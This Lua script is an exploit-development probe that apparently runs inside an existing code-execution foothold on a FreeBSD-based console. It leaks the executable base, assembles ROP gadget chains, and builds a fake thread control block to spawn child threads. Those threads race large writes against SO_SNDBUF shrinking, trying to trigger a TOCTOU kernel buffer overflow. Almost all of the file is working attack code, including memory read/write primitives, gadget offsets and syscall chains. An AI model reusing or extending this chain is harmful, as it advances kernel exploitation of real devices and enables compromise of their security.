-- CRASH_CLASS: HIGH
-- PROBE 1402b: SO_SNDBUF resize TOCTOU with child thread + prefill
--
-- prior art: 93a tried 50 iters, 0 anomalies. Notes say "try larger
--   SEND_SIZE, pre-fill buffer first." 93a used single child + main thread.
--   This version: pre-fills buffer to near capacity, then races child
--   sendmsg (large payload) vs child setsockopt(SO_SNDBUF, small).
--   The bug: sosend_generic drops SOCKBUF_LOCK during m_uiotombuf,
--   setsockopt(SO_SNDBUF) acquires SOCKBUF_LOCK and shrinks sb_hiwat.
--   If shrink lands while sendmsg is copying, appended data >> sb_hiwat.
--   384b: fake TCB, 396f: proven child ROP

print("=== PROBE 1402b: SO_SNDBUF RACE v2 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq2(addr, hi, lo)
    wd(addr, lo); wd(addr + 4, hi)
end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_read       = mk(3)
local sc_write      = mk(4)
local sc_nanosleep  = mk(240)
local sc_sendto     = mk(133)

local SOL_SOCKET = 0xFFFF
local SO_SNDBUF = 0x1001
local SO_RCVBUF = 0x1002

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets
local g = {}
local function gadget(name, off)
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
end
gadget("pop_rax", 0x992)
gadget("pop_rdi", 0xC9DFE)
gadget("pop_rsi", 0xD77D)
gadget("pop_rdx", 0x3B02D7)
gadget("pop_rcx", 0xE64)
gadget("pop_r8",  0x991)

local stub = N(syscall.pipe.fn_addr)
local stub_hi = math.floor(stub / 0x100000000)
local stub_lo = stub % 0x100000000
print(string.format("stub=0x%X%08X", stub_hi, stub_lo))

-- Shared fake TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

local STACK_SZ = 0x10000
local CHAIN_BASE = 0xE000

local function launch_child(chain)
    local stk = memory.alloc(STACK_SZ)
    local sn = N(stk)
    for i = 0, STACK_SZ - 4, 4 do wd(sn + i, 0) end
    local rsp = sn + CHAIN_BASE
    rsp = (math.floor(rsp / 16) * 16) - 8
    for i, entry in ipairs(chain) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2])
        wd(rsp + off + 4, entry[1])
    end
    local param = memory.alloc(0x40)
    local pn = N(param)
    wq2(pn + 0x00, g.pop_rax[1], g.pop_rax[2])
    wq2(pn + 0x08, 0, 0)
    wq2(pn + 0x10, get_hi_lo(stk))
    wq2(pn + 0x18, 0, CHAIN_BASE)
    wq2(pn + 0x20, 0, 0)
    wq2(pn + 0x28, 0, 0)
    local ctid = memory.alloc(8)
    wq2(pn + 0x30, get_hi_lo(ctid))
    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pn), uint64(0x38))
    end)
    if not ok_t then return -1 end
    return N(rv_t)
end

-- ============================================================
-- Phase 0: child test
-- ============================================================
print("")
print("--- child test ---")
local spb = memory.alloc(16)
local spr = N(sc_socketpair(uint64(1), uint64(2), uint64(0), uint64(spb)))
local sp_r = rd(N(spb)) or -1
local sp_w = rd(N(spb) + 4) or -1

local mark = memory.alloc(16)
wq2(N(mark), 0xCAFE, 0xBABE)
local mk_hi, mk_lo = get_hi_lo(mark)

local chain_t = {
    g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
    g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    g.pop_rdi, {0, sp_w}, g.pop_rsi, {mk_hi, mk_lo}, g.pop_rdx, {0, 8},
    g.pop_rax, {0, 4}, {stub_hi, stub_lo},
    g.pop_rdi, {0, 0}, g.pop_rax, {0, 431}, {stub_hi, stub_lo},
}
local tr = launch_child(chain_t)
print("thr_new=" .. tr)

local slp = memory.alloc(16)
wq2(N(slp), 0, 0); wd(N(slp) + 8, 50000000)
sc_nanosleep(uint64(N(slp)), uint64(0))

local rbuf = memory.alloc(16); wq2(N(rbuf), 0, 0)
local rr = N(sc_read(uint64(sp_r), uint64(N(rbuf)), uint64(8)))
local rh, rl = get_hi_lo(rq(N(rbuf)))
print(string.format("read=%d data=0x%X%08X", rr, rh, rl))
sc_close(uint64(sp_r)); sc_close(uint64(sp_w))

if rh ~= 0xCAFE or rl ~= 0xBABE then
    print("CHILD FAIL"); return
end
print("CHILD OK!")

-- ============================================================
-- Phase 1: SO_SNDBUF baseline
-- ============================================================
print("")
print("--- SO_SNDBUF baseline ---")
local spa = memory.alloc(16)
local r1 = N(sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(spa)))
local fa = rd(N(spa)) or -1
local fb = rd(N(spa) + 4) or -1
print(string.format("socketpair=%d fds=%d,%d", r1, fa, fb))

-- Read initial SNDBUF
local vbuf = memory.alloc(8)
local vlen = memory.alloc(8)
wd(N(vlen), 4)
sc_getsockopt(uint64(fa), uint64(SOL_SOCKET), uint64(SO_SNDBUF), uint64(N(vbuf)), uint64(N(vlen)))
local init_sndbuf = rd(N(vbuf)) or 0
print("initial SO_SNDBUF=" .. init_sndbuf)

-- Set to 65536
local val = memory.alloc(8)
wd(N(val), 65536)
local sr = N(sc_setsockopt(uint64(fa), uint64(SOL_SOCKET), uint64(SO_SNDBUF), uint64(N(val)), uint64(4)))
print("set(65536)=" .. sr)

wd(N(vlen), 4)
sc_getsockopt(uint64(fa), uint64(SOL_SOCKET), uint64(SO_SNDBUF), uint64(N(vbuf)), uint64(N(vlen)))
print("readback=" .. (rd(N(vbuf)) or 0))

-- Also bump RCVBUF on the other side
wd(N(val), 131072)
sc_setsockopt(uint64(fb), uint64(SOL_SOCKET), uint64(SO_RCVBUF), uint64(N(val)), uint64(4))

sc_close(uint64(fa)); sc_close(uint64(fb))

-- ============================================================
-- Phase 2: RACE — child sends large data, child shrinks SNDBUF
-- ============================================================
print("")
print("--- SO_SNDBUF race ---")

local ROUNDS = 20
local SEND_LOOPS = 30   -- child A: 30x write(fd, 4096B)
local SHRINK_LOOPS = 50 -- child B: 50x setsockopt(SO_SNDBUF, 256)
local anomalies = 0

-- Prepare 4KB send buffer (filled with marker)
local sendbuf = memory.alloc(4096)
local sn2 = N(sendbuf)
for i = 0, 4095, 4 do wd(sn2 + i, 0x41414141) end
local sbh, sbl = get_hi_lo(sendbuf)

-- Shrink value buffer
local shrink_val = memory.alloc(8)
wd(N(shrink_val), 256)
local svh, svl = get_hi_lo(shrink_val)

-- Expand value buffer
local expand_val = memory.alloc(8)
wd(N(expand_val), 65536)
local evh, evl = get_hi_lo(expand_val)

for round = 1, ROUNDS do
    local spa2 = memory.alloc(16)
    local r2 = N(sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(spa2)))
    local f_send = rd(N(spa2)) or -1
    local f_recv = rd(N(spa2) + 4) or -1
    if r2 ~= 0 then print("[R" .. round .. "] socketpair fail"); break end

    -- Set SNDBUF to 65536
    wd(N(val), 65536)
    sc_setsockopt(uint64(f_send), uint64(SOL_SOCKET), uint64(SO_SNDBUF), uint64(N(val)), uint64(4))
    -- Set RCVBUF to 131072
    wd(N(val), 131072)
    sc_setsockopt(uint64(f_recv), uint64(SOL_SOCKET), uint64(SO_RCVBUF), uint64(N(val)), uint64(4))

    -- Pre-fill: send ~60KB to nearly fill the 65536 buffer
    for pfill = 1, 14 do
        sc_write(uint64(f_send), uint64(sn2), uint64(4096))
    end

    -- Child A: sysarch + write(f_send, sendbuf, 4096) x SEND_LOOPS + thr_exit
    local ca = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, SEND_LOOPS do
        ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, f_send}
        ca[#ca+1] = g.pop_rsi; ca[#ca+1] = {sbh, sbl}
        ca[#ca+1] = g.pop_rdx; ca[#ca+1] = {0, 4096}
        ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 4}
        ca[#ca+1] = {stub_hi, stub_lo}
    end
    ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, 0}
    ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 431}
    ca[#ca+1] = {stub_hi, stub_lo}

    -- Child B: sysarch + setsockopt(SO_SNDBUF, 256) x SHRINK_LOOPS + thr_exit
    local cb = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, SHRINK_LOOPS do
        -- setsockopt(f_send, SOL_SOCKET, SO_SNDBUF, &256, 4)
        cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, f_send}
        cb[#cb+1] = g.pop_rsi; cb[#cb+1] = {0, SOL_SOCKET}
        cb[#cb+1] = g.pop_rdx; cb[#cb+1] = {0, SO_SNDBUF}
        cb[#cb+1] = g.pop_rcx; cb[#cb+1] = {svh, svl}
        cb[#cb+1] = g.pop_r8;  cb[#cb+1] = {0, 4}
        cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 105}
        cb[#cb+1] = {stub_hi, stub_lo}
        -- Also re-expand to keep the window open
        cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, f_send}
        cb[#cb+1] = g.pop_rsi; cb[#cb+1] = {0, SOL_SOCKET}
        cb[#cb+1] = g.pop_rdx; cb[#cb+1] = {0, SO_SNDBUF}
        cb[#cb+1] = g.pop_rcx; cb[#cb+1] = {evh, evl}
        cb[#cb+1] = g.pop_r8;  cb[#cb+1] = {0, 4}
        cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 105}
        cb[#cb+1] = {stub_hi, stub_lo}
    end
    cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, 0}
    cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 431}
    cb[#cb+1] = {stub_hi, stub_lo}

    if round == 1 then
        print(string.format("chain_a=%d chain_b=%d entries", #ca, #cb))
    end

    local ra = launch_child(ca)
    local rb = launch_child(cb)

    -- Wait for children
    wq2(N(slp), 0, 0); wd(N(slp) + 8, 150000000)  -- 150ms
    sc_nanosleep(uint64(N(slp)), uint64(0))

    -- Check final SNDBUF and how much data is in the buffer
    wd(N(vlen), 4)
    sc_getsockopt(uint64(f_send), uint64(SOL_SOCKET), uint64(SO_SNDBUF), uint64(N(vbuf)), uint64(N(vlen)))
    local final_sndbuf = rd(N(vbuf)) or 0

    -- Drain and count received bytes
    local drain = memory.alloc(0x4000)
    local total_recv = 0
    for attempt = 1, 40 do
        local rr2 = N(sc_read(uint64(f_recv), uint64(N(drain)), uint64(0x4000)))
        if rr2 <= 0 then break end
        total_recv = total_recv + rr2
    end

    -- Anomaly: if total_recv > 65536 (buffer was overfilled)
    local is_anom = (total_recv > 65536)
    if is_anom then
        anomalies = anomalies + 1
        print(string.format("[R%d] *** OVERFLOW *** recv=%d sndbuf=%d thr=%d/%d",
            round, total_recv, final_sndbuf, ra, rb))
    else
        print(string.format("[R%d] recv=%d sndbuf=%d thr=%d/%d",
            round, total_recv, final_sndbuf, ra, rb))
    end

    sc_close(uint64(f_send)); sc_close(uint64(f_recv))
end

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies ===", ROUNDS, anomalies))
if anomalies > 0 then
    print("*** BUFFER OVERFLOW DETECTED — TOCTOU race confirmed ***")
else
    print("No overflow detected. May need more iterations or different timing.")
end
print("=== PROBE 1402b COMPLETE ===")
